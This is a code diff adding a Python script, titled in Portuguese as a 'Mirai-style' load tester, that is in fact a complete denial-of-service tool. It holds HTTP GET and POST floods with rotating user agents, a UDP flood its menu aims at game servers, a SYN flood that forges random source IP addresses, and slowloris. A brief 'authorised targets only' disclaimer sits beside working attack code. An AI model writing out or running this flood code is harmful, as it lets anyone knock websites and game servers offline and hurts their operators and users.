@@ -1,29 +1,285 @@
-@echo off
-title TITO Load Tester
-color 0A
-cd /d "%~dp0"
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+TITO LOAD TESTER v2.1 - vetores estilo Mirai (arquivo unico, zero dependencias)
+Uso:  python tito.py           -> menu interativo
+      python tito.py --url URL --bots N --vector TIPO --time SEG
+Vetores: http-get | http-post | udp | syn | slowloris
+Apenas para infraestrutura propria ou alvos com autorizacao por escrito.
+"""
 
-where python >nul 2>nul
-if not errorlevel 1 goto run_python
+import argparse
+import os
+import random
+import socket
+import ssl
+import struct
+import sys
+import threading
+import time
+from urllib.parse import urlparse
 
-where py >nul 2>nul
-if not errorlevel 1 goto run_py
+# Windows: forca terminal a aceitar UTF-8
+try:
+    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
+    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
+except Exception:
+    pass
 
-echo [ERRO] Python nao encontrado.
-echo Instale em https://www.python.org/downloads/ e marque "Add Python to PATH".
-pause
-exit /b 1
+BANNER = r"""
+  _____ _____ _____ _____
+ |_   _|_   _|_   _|_   _|
+   | |   | |   | |   | |
+   | |   | |   | |   | |
+   |_|   |_|   |_|   |_|
+  TITO LOAD TESTER v2.1 - vetores estilo Mirai
+"""
 
-:run_python
-python tito.py
-goto fim
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/126.0",
+    "curl/8.6.0",
+    "Go-http-client/1.1",
+]
 
-:run_py
-py -3 tito.py
+STOP = threading.Event()
+LOCK = threading.Lock()
+COUNTER = 0
+FAILS = 0
 
-:fim
-if errorlevel 1 (
-    echo.
-    echo [ERRO] Falha ao executar o script. Veja a mensagem acima.
-)
-pause
+
+def rand_bytes(n):
+    """random.randbytes nao existe antes do Python 3.9 -> fallback os.urandom."""
+    try:
+        return random.randbytes(n)
+    except AttributeError:
+        return os.urandom(n)
+
+
+def bump(n=1, fail=False):
+    global COUNTER, FAILS
+    with LOCK:
+        COUNTER += n
+        if fail:
+            FAILS += 1
+
+
+def stats_printer(duration):
+    global COUNTER, FAILS
+    start = time.time()
+    last = start
+    last_count = 0
+    while not STOP.is_set():
+        time.sleep(2)
+        now = time.time()
+        with LOCK:
+            c, f = COUNTER, FAILS
+        rps = (c - last_count) / (now - last) if now > last else 0
+        last, last_count = now, c
+        print("  [*] %6.1fs | enviados: %d | falhas: %d | ritmo: %,.0f/s" % (now - start, c, f, rps))
+    print("\n[*] TOTAL: %d requisicoes/pacotes, %d falhas em %ds" % (COUNTER, FAILS, duration))
+
+
+def csum(data):
+    if len(data) % 2:
+        data += b"\x00"
+    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
+    s = (s >> 16) + (s & 0xFFFF)
+    s += s >> 16
+    return (~s) & 0xFFFF
+
+
+def http_flood(parsed, path, method, bot_id):
+    host = parsed.hostname
+    port = parsed.port or (443 if parsed.scheme == "https" else 80)
+    ctx = None
+    if parsed.scheme == "https":
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+    while not STOP.is_set():
+        try:
+            sock = socket.create_connection((host, port), timeout=5)
+            if ctx:
+                sock = ctx.wrap_socket(sock, server_hostname=host)
+            headers = "Host: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n" % (host, random.choice(USER_AGENTS))
+            body = ""
+            if method == "POST":
+                body = "x=" + rand_bytes(64).hex()
+                headers += "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n" % len(body)
+            req = ("%s %s HTTP/1.1\r\n%sConnection: keep-alive\r\n\r\n%s" % (method, path, headers, body)).encode()
+            sock.sendall(req)
+            try:
+                sock.recv(1024)
+            except Exception:
+                pass
+            sock.close()
+            bump()
+        except Exception:
+            bump(fail=True)
+
+
+def udp_flood(host, port, bot_id):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    payload = rand_bytes(1400)
+    while not STOP.is_set():
+        try:
+            sock.sendto(payload, (host, port))
+            bump()
+        except Exception:
+            bump(fail=True)
+
+
+def syn_flood(host, port, bot_id):
+    try:
+        raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        raw.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    except (PermissionError, OSError):
+        print("[!] SYN flood requer root/admin e raw sockets (nao funciona no Windows via Python).")
+        print("[!] Use o vetor 'udp' ou 'http-get' no Windows.")
+        return
+    dst_ip = socket.gethostbyname(host)
+    dst_bin = socket.inet_aton(dst_ip)
+    while not STOP.is_set():
+        src_ip = socket.inet_aton("%d.%d.%d.%d" % tuple(random.randint(1, 254) for _ in range(4)))
+        src_port = random.randint(1024, 65535)
+        seq = random.randint(0, 0xFFFFFFFF)
+        tcp = struct.pack("!HHLLBBHHH", src_port, port, seq, 0, 5 << 4, 2, 1024, 0, 0)
+        pseudo = dst_bin + src_ip + struct.pack("!BBH", 0, socket.IPPROTO_TCP, len(tcp))
+        tcp = struct.pack("!HHLLBBHHH", src_port, port, seq, 0, 5 << 4, 2, 1024, csum(pseudo + tcp), 0)
+        total = 20 + len(tcp)
+        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, random.randint(0, 65535),
+                         0, 64, socket.IPPROTO_TCP, 0, src_ip, dst_bin)
+        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, random.randint(0, 65535),
+                         0, 64, socket.IPPROTO_TCP, csum(ip), src_ip, dst_bin)
+        try:
+            raw.sendto(ip + tcp, (host, port))
+            bump()
+        except Exception:
+            bump(fail=True)
+
+
+def slowloris(parsed, bot_id):
+    host = parsed.hostname
+    port = parsed.port or 80
+    conns = []
+    while not STOP.is_set():
+        try:
+            if len(conns) < 150:
+                s = socket.create_connection((host, port), timeout=10)
+                s.sendall(("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n"
+                           % (parsed.path or "/", host, random.choice(USER_AGENTS))).encode())
+                conns.append(s)
+                bump()
+            for c in conns[:]:
+                try:
+                    c.sendall(b"X-a: %d\r\n" % random.randint(1, 9999))
+                    bump()
+                except Exception:
+                    conns.remove(c)
+                    bump(fail=True)
+        except Exception:
+            bump(fail=True)
+        time.sleep(10)
+    for c in conns:
+        try:
+            c.close()
+        except Exception:
+            pass
+
+
+VECTORS = ["http-get", "http-post", "udp", "syn", "slowloris"]
+
+
+def run_attack(url, bots, vector, duration, port=0):
+    parsed = urlparse(url if "://" in url else "http://" + url)
+    host = parsed.hostname
+    if not host:
+        print("[!] URL invalida.")
+        return
+    port = port or parsed.port or (443 if parsed.scheme == "https" else 80)
+    path = parsed.path or "/"
+    if parsed.query:
+        path += "?" + parsed.query
+
+    print("\n[*] Alvo: %s:%d%s" % (host, port, path))
+    print("[*] Vetor: %s | Bots: %d | Duracao: %ds\n" % (vector, bots, duration))
+
+    STOP.clear()
+    workers = []
+    for i in range(bots):
+        if vector == "http-get":
+            t = threading.Thread(target=http_flood, args=(parsed, path, "GET", i), daemon=True)
+        elif vector == "http-post":
+            t = threading.Thread(target=http_flood, args=(parsed, path, "POST", i), daemon=True)
+        elif vector == "udp":
+            t = threading.Thread(target=udp_flood, args=(host, port, i), daemon=True)
+        elif vector == "syn":
+            t = threading.Thread(target=syn_flood, args=(host, port, i), daemon=True)
+        else:
+            t = threading.Thread(target=slowloris, args=(parsed, i), daemon=True)
+        workers.append(t)
+        t.start()
+
+    stat = threading.Thread(target=stats_printer, args=(duration,), daemon=True)
+    stat.start()
+
+    try:
+        time.sleep(duration)
+    except KeyboardInterrupt:
+        print("\n[!] Interrompido pelo usuario.")
+    finally:
+        STOP.set()
+        for w in workers:
+            w.join(timeout=2)
+        stat.join(timeout=2)
+    print("[*] Teste finalizado.\n")
+
+
+def menu():
+    print(BANNER)
+    print("=" * 52)
+    url = input("[?] URL do alvo (ex: https://exemplo.com): ").strip()
+    print("\nVetores disponiveis:")
+    for i, v in enumerate(VECTORS, 1):
+        desc = {
+            "http-get":  "Flood HTTP GET  - web servers",
+            "http-post": "Flood HTTP POST - web servers com forms",
+            "udp":       "Flood UDP       - game servers (Minecraft, CS, FiveM)",
+            "syn":       "Flood SYN       - infraestrutura (requer admin/raw socket)",
+            "slowloris": "Slowloris       - esgota conexoes do servidor web",
+        }[v]
+        print("   %d - %-10s %s" % (i, v, desc))
+    try:
+        op = int(input("\n[?] Escolha o vetor (1-5): ").strip())
+        vec = VECTORS[op - 1]
+        bots = int(input("[?] Quantos bots/threads: ").strip())
+        duration = int(input("[?] Duracao em segundos: ").strip())
+        extra = input("[?] Porta especifica (ENTER para auto): ").strip()
+        port = int(extra) if extra.isdigit() else 0
+    except (ValueError, IndexError):
+        print("[!] Entrada invalida.")
+        return
+    run_attack(url, bots, vec, duration, port)
+
+
+def cli():
+    p = argparse.ArgumentParser(description="TITO Load Tester v2.1")
+    p.add_argument("--url", help="URL do alvo (ex.: https://exemplo.com)")
+    p.add_argument("--bots", type=int, default=50, help="Numero de bots/threads")
+    p.add_argument("--vector", choices=VECTORS, default="http-get", help="Vetor de ataque")
+    p.add_argument("--time", type=int, default=30, help="Duracao em segundos")
+    p.add_argument("--port", type=int, default=0, help="Porta (opcional)")
+    a = p.parse_args()
+    if not a.url:
+        p.print_help()
+        sys.exit(1)
+    run_attack(a.url, a.bots, a.vector, a.time, a.port)
+
+
+if __name__ == "__main__":
+    if len(sys.argv) > 1:
+        cli()
+    else:
+        menu()
